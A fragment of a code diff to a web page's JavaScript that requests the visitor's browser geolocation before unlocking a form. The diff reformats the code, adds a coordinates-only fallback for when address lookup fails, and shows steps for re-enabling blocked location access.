-          capturedAddress = capturedLat.toFixed(6)+', '+capturedLon.toFixed(6);
+        .catch(function() {
+          /* Geocode API failed — fall back to coords only */
+          capturedAddress = capturedLat.toFixed(6) + ', ' + capturedLon.toFixed(6);
+          locationCaptured = true;
 
-          document.getElementById('modal-addr-text').textContent='Coordinates: '+capturedAddress;
-          document.getElementById('modal-addr-coords').textContent='Accuracy: ~'+accuracy+'m';
-          document.getElementById('modal-address-box').style.display='block';
+          /* Show coords in card with "Not available" for text fields */
+          renderAddressCard({ street:'', area:'', district:'', city:'', state:'', postcode:'', country:'' },
+                            capturedLat, capturedLon, accuracy);
 
-          locationCaptured=true;
-          console.log('=== VISITOR LOCATION CAPTURED ===');
-          console.log('Coordinates : ', capturedAddress);
-          console.log('Accuracy    : ', accuracy+' meters');
+          console.log('=== VISITOR LOCATION (coords only) ===');
+          console.log('Lat:', capturedLat, '| Lon:', capturedLon, '| Accuracy:', Math.round(accuracy)+'m');
 
-          btn.textContent='✅ Verified — Proceeding...';
-          setStatus('✅ Coordinates confirmed!','status-success');
-          unlockForm(capturedAddress, capturedLat, capturedLon);
-          setTimeout(function(){closeModalAndProceed();},2200);
+          btn.textContent = '✅ Coordinates Verified — Proceeding...';
+          setStatus('✅ Coordinates confirmed (address lookup unavailable).', 'status-success');
+          unlockForm(capturedAddress);
+          setTimeout(function() { closeModalAndProceed(); }, 2400);
         });
     },
 
     /* ── ERROR ── */
-    function(error){
-      btn.disabled=false;
-      btn.textContent='Allow Location & Continue';
+    function(error) {
+      btn.disabled    = false;
+      btn.textContent = 'Allow Location & Continue';
 
-      if(error.code===1){
-        // Permission denied — show browser-specific fix steps
-        setStatus('⚠️ Location access was blocked. Follow the steps below to enable it:','status-denied');
-        var steps=getDeniedSteps();
-        var ol=document.getElementById('denied-steps');
-        ol.innerHTML='';
-        steps.forEach(function(s){
-          var li=document.createElement('li');
-          li.innerHTML=s;
+      if (error.code === 1) {
+        setStatus('⚠️ Location access was blocked. Follow the steps below to enable it:', 'status-denied');
+        var steps = getDeniedSteps();
+        var ol = document.getElementById('denied-steps');
+        ol.innerHTML = '';
+        steps.forEach(function(s) {
+          var li = document.createElement('li');
+          li.innerHTML = s;
           ol.appendChild(li);
         });
-        deniedBox.style.display='block';
-        retryBtn.style.display='block';
-      } else if(error.code===2){
-        setStatus('⚠️ Location signal unavailable. Check your device GPS and try again.','status-denied');
-        retryBtn.style.display='block';
+        deniedBox.style.display = 'block';
+        retryBtn.style.display  = 'block';
+      } else if (error.code === 2) {
+        setStatus('⚠️ Location signal unavailable. Check your device GPS and try again.', 'status-denied');
+        retryBtn.style.display = 'block';
       } else {
-        setStatus('⚠️ Request timed out. Please try again.','status-denied');
-        retryBtn.style.display='block';
+        setStatus('⚠️ Request timed out. Please try again.', 'status-denied');
+        retryBtn.style.display = 'block';
       }
     },
-    {enableHighAccuracy:true, timeout:15000, maximumAge:0}
+    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
   );
 }
 </script>
